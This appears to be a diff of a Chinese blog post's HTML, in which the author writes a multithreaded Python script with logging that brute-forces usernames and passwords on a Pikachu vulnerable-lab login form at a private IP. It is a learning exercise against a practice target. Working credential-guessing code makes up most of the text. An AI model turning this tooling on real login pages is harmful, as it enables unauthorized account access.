class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    run(username, password, url, timeout)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time&quot;</span>+<span class="built_in">str</span>(end - start)+<span class="string">&quot;seconds&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-import requests
-import argparse
-import time
-# 文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-timeout = args.timeout
-# print(username)
-# print(password)
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-
-# 探活
-def check(url, timeout):
-    try:
-        respone = requests.get(url, timeout=timeout)
-        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return respone.status_code
-    except requests.exceptions.RequestException as e:
-        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-
-
-# 主函数
-def run(username, password, url, timeout):
-    if check(url, timeout) != 200:
-        return
-    for i in username:
-        for j in password:
-            data = &#123;
-                &quot;username&quot;: i,
-                &quot;password&quot;: j,
-                &quot;submit&quot;: &quot;Login&quot;
-            &#125;
-            r = requests.post(url, data=data)
-            if &quot;success&quot; in r.text:
-                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)
-            # else:
-            #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)
-    return
-
-if __name__ == &quot;__main__&quot;:
-    start = time.time()
-    run(username, password, url, timeout)
-    end = time.time()
-    print(&quot;time&quot;+str(end - start)+&quot;seconds&quot;)
-</code></pre>
 <p>多线程</p>
-<pre><code class="python">#!/usr/bin/ python3
-# _*_ coding:utf-8 _*_
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"><span class="comment"># print(username)</span></span><br><span class="line"><span class="comment"># print(password)</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password,url,timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i,j,url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time&quot;</span>+<span class="built_in">str</span>(end - start)+<span class="string">&quot;seconds&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-import requests
-import argparse
-import threading
-import time
-
-# 文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-timeout = args.timeout
-# print(username)
-# print(password)
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-
-# 探活
-def check(url, timeout):
-    try:
-        respone = requests.get(url, timeout=timeout)
-        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return respone.status_code
-    except requests.exceptions.RequestException as e:
-        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-
-
-# 主函数
-def run(username, password, url):
-
-    data = &#123;
-        &quot;username&quot;: username,
-        &quot;password&quot;: password,
-        &quot;submit&quot;: &quot;Login&quot;
-    &#125;
-    r = requests.post(url, data=data)
-    if &quot;success&quot; in r.text:
-        print(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)
-    # else:
-    #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)
-    return
-
-# 多线程
-def multi_thread(username, password,url,timeout):
-    if check(url, timeout) != 200:
-        return
-
-    threads = []
-    for i in username:
-        for j in password:
-            threads.append(threading.Thread(target=run, args=(i,j,url,)))
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-    print(&quot;运行结束&quot;)
-
-if __name__ == &quot;__main__&quot;:
-    start = time.time()
-    multi_thread(username, password, url, timeout)
-    end = time.time()
-    print(&quot;time&quot;+str(end - start)+&quot;seconds&quot;)
-</code></pre>
 <h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><h4 id="少量数据"><a href="#少量数据" class="headerlink" title="少量数据"></a>少量数据</h4><p><img src="/../image/image-20240720210135386.png" alt="image-20240720210135386"></p>
 <p><img src="/../image/image-20240720210143724.png" alt="image-20240720210143724"></p>
 <p>可以看到原版还更快</p>
@@ -522,19 +282,8 @@ if __name__ == &quot;__main__&quot;:
 <p><img src="/../image/image-20240720212023505.png" alt="image-20240720212023505"></p>
 <p>可以看到数据量大了，多线程的速度快的多，快了快一倍，但测试中也有问题，多线程容易报错，而且一报错就很多报错信息。。。。可能是因为没有上锁导致的安全问题，这个要学的就有点多了。。。果然把BP用好比啥都强。。。</p>
 <h2 id="扩展四：输出日志"><a href="#扩展四：输出日志" class="headerlink" title="扩展四：输出日志"></a>扩展四：输出日志</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chrnhao/article/details/138216601">https://blog.csdn.net/chrnhao/article/details/138216601</a></p>
-<pre><code class="python"># 配置日志记录
-logging.basicConfig(level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-logger = logging.getLogger(__name__)
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>_<span class="subst">&#123;url.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.INFO)</span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br></pre></td></tr></table></figure>
 
-# 创建文件处理程序
-current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())
-log_file_name = f&quot;&#123;current_time&#125;_&#123;url.replace(&#39;/&#39;, &#39;_&#39;).replace(&#39;:&#39;, &#39;_&#39;)&#125;.txt&quot;
-file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)
-file_handler.setLevel(logging.INFO)
-file_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-file_handler.setFormatter(file_formatter)
-logger.addHandler(file_handler)
-</code></pre>
 <p><img src="/../image/image-20240720212050200.png" alt="image-20240720212050200"></p>
 <p><img src="/../image/image-20240720212100919.png" alt="image-20240720212100919"></p>
 <p><img src="/../image/image-20240720212122504.png" alt="image-20240720212122504"></p>
@@ -545,330 +294,28 @@ logger.addHandler(file_handler)
 <p><img src="/../image/image-20240720212449229.png" alt="image-20240720212449229"></p>
 <p>无法连接，这个我也无法解决</p>
 <h3 id="错误信息太多"><a href="#错误信息太多" class="headerlink" title="错误信息太多"></a>错误信息太多</h3><p>看不过来我们可以提升日志记录的等级为，把error也记录进去</p>
-<pre><code class="python"># 配置日志记录
-logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-logger = logging.getLogger(__name__)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure>
+
 <p>在查看代码的过程发现，有这么多异常信息是因为run’没有作异常处理</p>
 <p><img src="/../image/image-20240720212620278.png" alt="image-20240720212620278"></p>
 <p>做一下requests的异常处理</p>
-<pre><code class="python"># 主函数
-def run(username, password, url):
-    try:
-        data = &#123;
-            &quot;username&quot;: username,
-            &quot;password&quot;: password,
-            &quot;submit&quot;: &quot;Login&quot;
-        &#125;
-        r = requests.post(url, data=data)
-        if &quot;success&quot; in r.text:
-            logger.info(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)
-        # else:
-        #     logger.info(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)
-    except requests.exceptions.RequestException as e:
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            logger.info(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     logger.info(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        logger.exception(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>,测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-        logger.exception(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;,测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)
-</code></pre>
 <h3 id="输出复杂（日志就不带url，太长了）"><a href="#输出复杂（日志就不带url，太长了）" class="headerlink" title="输出复杂（日志就不带url，太长了）"></a>输出复杂（日志就不带url，太长了）</h3><p><img src="/../image/image-20240720214659595.png" alt="image-20240720214659595"></p>
 <p>密密麻麻的，不好找，在最后再加一个正确的输出结果，先用一个列表把成功的结果存起来,下面是改完后的完整代码</p>
-<pre><code class="python">import requests
-import argparse
-import threading
-import time
-import logging
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 DEBUG</span></span><br><span class="line">file_formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储成功的结果</span></span><br><span class="line">success_results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制参数</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=timeout)</span><br><span class="line">        logger.info(<span class="string">f&quot;响应状态码：<span class="subst">&#123;response.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            success_results.append(<span class="string">f&quot;[+]爆破成功：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(success_results[-<span class="number">1</span>])  <span class="comment"># 记录成功的日志信息</span></span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             logger.debug(<span class="string">f&quot;[-]爆破失败：用户名：<span class="subst">&#123;username&#125;</span>，密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>, 测试数据: username:<span class="subst">&#123;username&#125;</span>, password <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi_thread</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            threads.append(threading.Thread(target=run, args=(i, j, url,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;运行结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出成功的结果</span></span><br><span class="line">    logger.info(<span class="string">&quot;成功的结果:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> success_results:</span><br><span class="line">        logger.info(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    multi_thread(username, password, url, timeout)</span><br></pre></td></tr></table></figure>
 
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-# 配置日志记录
-logging.basicConfig(level=logging.DEBUG, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-logger = logging.getLogger(__name__)
-
-# 创建文件处理程序
-current_time = time.strftime(&#39;%Y-%m-%d_%H-%M-%S&#39;, time.localtime())
-log_file_name = f&quot;&#123;current_time&#125;.txt&quot;
-file_handler = logging.FileHandler(log_file_name, encoding=&#39;utf-8&#39;)
-file_handler.setLevel(logging.DEBUG)  # 设置日志级别为 DEBUG
-file_formatter = logging.Formatter(&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
-file_handler.setFormatter(file_formatter)
-logger.addHandler(file_handler)
-
-# 用于存储成功的结果
-success_results = []
-
-
-# 文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-# 控制参数
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-timeout = args.timeout
-
-
-# 探活
-def check(url, timeout):
-    try:
-        response = requests.get(url, timeout=timeout)
-        logger.info(f&quot;响应状态码：&#123;response.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return response.status_code
-    except requests.exceptions.RequestException as e:
-        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-
-
-# 主函数
-def run(username, password, url):
-    try:
-        data = &#123;
-            &quot;username&quot;: username,
-            &quot;password&quot;: password,
-            &quot;submit&quot;: &quot;Login&quot;
-        &#125;
-        r = requests.post(url, data=data)
-        if &quot;success&quot; in r.text:
-            success_results.append(f&quot;[+]爆破成功：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-            logger.info(success_results[-1])  # 记录成功的日志信息
-         else:
-             logger.debug(f&quot;[-]爆破失败：用户名：&#123;username&#125;，密码：&#123;password&#125;&quot;)
-    except requests.exceptions.RequestException as e:
-        logger.error(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;, 测试数据: username:&#123;username&#125;, password &#123;password&#125;&quot;)
-
-
-# 多线程
-def multi_thread(username, password, url, timeout):
-    if check(url, timeout) != 200:
-        return
-
-    threads = []
-    for i in username:
-        for j in password:
-            threads.append(threading.Thread(target=run, args=(i, j, url,)))
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-    logger.info(&quot;运行结束&quot;)
-
-    # 输出成功的结果
-    logger.info(&quot;成功的结果:&quot;)
-    for result in success_results:
-        logger.info(result)
-
-
-if __name__ == &quot;__main__&quot;:
-    multi_thread(username, password, url, timeout)
-</code></pre>
 <p>查看运行结果</p>
 <p><img src="/../image/image-20240720214903717.png" alt="image-20240720214903717"></p>
 <p>不错，检查下日志</p>
 <p><img src="/../image/image-20240720214928207.png" alt="image-20240720214928207"></p>
 <p>加上错误原因，省略爆破失败的结果</p>
-<pre><code class="python">import requests
-import argparse
-import threading
-import time
-import logging
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="comment"># 配置日志记录</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件处理程序</span></span><br><span class="line">current_time = time.strftime(<span class="string">&#x27;%Y-%m-%d_%H-%M-%S&#x27;</span>, time.localtime())</span><br><span class="line">log_file_name = <span class="string">f&quot;<span class="subst">&#123;current_time&#125;</span>.txt&quot;</span></span><br><span class="line">file_handler = logging.FileHandler(log_file_name, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_handler.setLevel(logging.DEBUG)  <span class="comment"># 设置日志级别为 